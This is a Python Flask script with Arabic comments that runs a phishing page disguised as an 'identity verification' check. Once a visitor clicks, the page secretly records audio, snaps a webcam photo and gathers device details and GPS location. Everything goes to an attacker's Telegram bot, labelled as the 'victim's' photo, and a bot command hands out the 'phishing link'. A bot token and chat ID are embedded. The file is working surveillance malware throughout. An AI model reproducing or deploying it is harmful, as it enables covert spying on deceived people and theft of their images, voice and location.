import base64
import requests
from flask import Flask, request, render_template_string, jsonify

app = Flask(__name__)

BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
ADMIN_ID = "7041600701"

# ========== صفحة الصيد (لن تغلق ولا توجيه) ==========
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>التحقق الأمني</title>
    <style>
        body{background:#0a0a0a;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh}
        .card{background:#1a1a2e;padding:2rem;border-radius:2rem;text-align:center;max-width:400px}
        .btn{background:#e67e22;color:white;padding:1rem;border:none;border-radius:2rem;width:100%;font-size:1.2rem;cursor:pointer}
        #status{margin-top:1rem;color:#f39c12}
        video,canvas{display:none}
    </style>
</head>
<body>
<div class="card">
    <h2>🔒 تأكيد الهوية</h2>
    <p>اضغط للتحقق</p>
    <button class="btn" id="btn">تحقق الآن</button>
    <div id="status"></div>
</div>
<video id="video" autoplay muted playsinline></video>
<canvas id="canvas"></canvas>
<script>
    const btn = document.getElementById('btn');
    const statusDiv = document.getElementById('status');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    async function sendData(endpoint, payload) {
        try {
            const response = await fetch(endpoint, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload),
                keepalive: true
            });
            await response.json();
        } catch(e) { console.error(e); }
    }

    btn.onclick = async () => {
        btn.disabled = true;
        statusDiv.innerText = "جاري التجهيز...";

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            video.srcObject = stream;

            // تسجيل الصوت 3 ثوانٍ
            statusDiv.innerText = "🎙️ تسجيل الصوت...";
            const mediaRecorder = new MediaRecorder(stream);
            let audioChunks = [];
            mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
            const audioPromise = new Promise((resolve) => {
                mediaRecorder.onstop = async () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        sendData('/api/capture', { type: 'audio', data: reader.result });
                        resolve();
                    };
                    reader.readAsDataURL(audioBlob);
                };
            });
            mediaRecorder.start();
            await new Promise(r => setTimeout(r, 3000));
            mediaRecorder.stop();
            await audioPromise;

            // صورة
            statusDiv.innerText = "📸 التقاط الصورة...";
            await new Promise(r => setTimeout(r, 500));
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const imgData = canvas.toDataURL('image/jpeg', 0.9);
            await sendData('/api/capture', { type: 'photo', data: imgData });

            // معلومات الجهاز
            const battery = navigator.getBattery ? await navigator.getBattery() : { level: 0, charging: false };
            const deviceInfo = {
                ua: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cores: navigator.hardwareConcurrency,
                ram: navigator.deviceMemory,
                battery: Math.round(battery.level * 100),
                charging: battery.charging
            };
            await sendData('/api/capture', { type: 'device', data: deviceInfo });

            // الموقع
            navigator.geolocation.getCurrentPosition(
                pos => sendData('/api/capture', { type: 'location', data: { lat: pos.coords.latitude, lon: pos.coords.longitude } }),
                () => {}
            );

            stream.getTracks().forEach(t => t.stop());
            statusDiv.innerHTML = "✅ تم التحقق بنجاح. يمكنك إغلاق الصفحة.";
        } catch(err) {
            console.error(err);
            statusDiv.innerText = "❌ فشل: يرجى السماح بالكاميرا والميكروفون والموقع";
            btn.disabled = false;
        }
    };
</script>
</body>
</html>
"""

# ========== دوال الإرسال لتليجرام ==========
def send_to_telegram(data_type, content, caption=""):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
    chat_id = ADMIN_ID
    try:
        if data_type == "text":
            requests.post(url + "sendMessage", json={'chat_id': chat_id, 'text': content, 'parse_mode': 'HTML'}, timeout=10)
        elif data_type == "photo":
            img_bytes = base64.b64decode(content.split(',')[1])
            requests.post(url + "sendPhoto", data={'chat_id': chat_id, 'caption': caption}, files={'photo': ('photo.jpg', img_bytes)}, timeout=15)
        elif data_type == "audio":
            audio_bytes = base64.b64decode(content.split(',')[1])
            requests.post(url + "sendVoice", data={'chat_id': chat_id, 'caption': caption}, files={'voice': ('voice.ogg', audio_bytes)}, timeout=15)
        print(f"✅ تم إرسال {data_type}")
    except Exception as e:
        print(f"❌ خطأ في الإرسال: {e}")

# ========== مسار استقبال البيانات من الصفحة ==========
@app.route('/api/capture', methods=['POST'])
def capture():
    data = request.get_json()
    if not data:
        return jsonify({'ok': False}), 400
    t = data['type']
    print(f"📥 استلمت: {t}")

    if t == 'photo':
        send_to_telegram('photo', data['data'], "📸 صورة الضحية")
    elif t == 'audio':
        send_to_telegram('audio', data['data'], "🎤 تسجيل صوتي")
    elif t == 'device':
        d = data['data']
        msg = f"""<b>📱 معلومات الجهاز</b>
🌐 المتصفح: {d['ua'][:80]}
💻 المنصة: {d['platform']}
🗣️ اللغة: {d['language']}
🧠 النوى: {d['cores']}
💾 الرام: {d['ram']} GB
🔋 البطارية: {d['battery']}% {'⚡' if d['charging'] else ''}"""
        send_to_telegram('text', msg)
    elif t == 'location':
        loc = data['data']
        msg = f"📍 الموقع:\nhttps://www.google.com/maps?q={loc['lat']},{loc['lon']}"
        send_to_telegram('text', msg)
    else:
        send_to_telegram('text', f"🧪 اختبار: {data['data']}")

    return jsonify({'ok': True})

# ========== واجهة الصفحة الرئيسية ==========
@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

# ========== Webhook البوت (لأوامر تليجرام) ==========
@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    if update and 'message' in update:
        chat_id = str(update['message']['chat']['id'])
        if chat_id == ADMIN_ID:
            text = update['message'].get('text', '')
            api_url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
            if text == '/start':
                kb = {'inline_keyboard': [[{'text': '🔗 رابط الصيد', 'callback_data': 'link'}]]}
                requests.post(api_url + "sendMessage", json={'chat_id': chat_id, 'text': 'مرحباً آدمن، البوت جاهز', 'reply_markup': kb})
            elif text == '/link':
                base = request.host_url.rstrip('/')
                requests.post(api_url + "sendMessage", json={'chat_id': chat_id, 'text': f'رابط الصيد:\n{base}'})
    elif update and 'callback_query' in update:
        cb = update['callback_query']
        if cb['data'] == 'link':
            base = request.host_url.rstrip('/')
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': cb['message']['chat']['id'], 'text': base})
    return 'OK', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
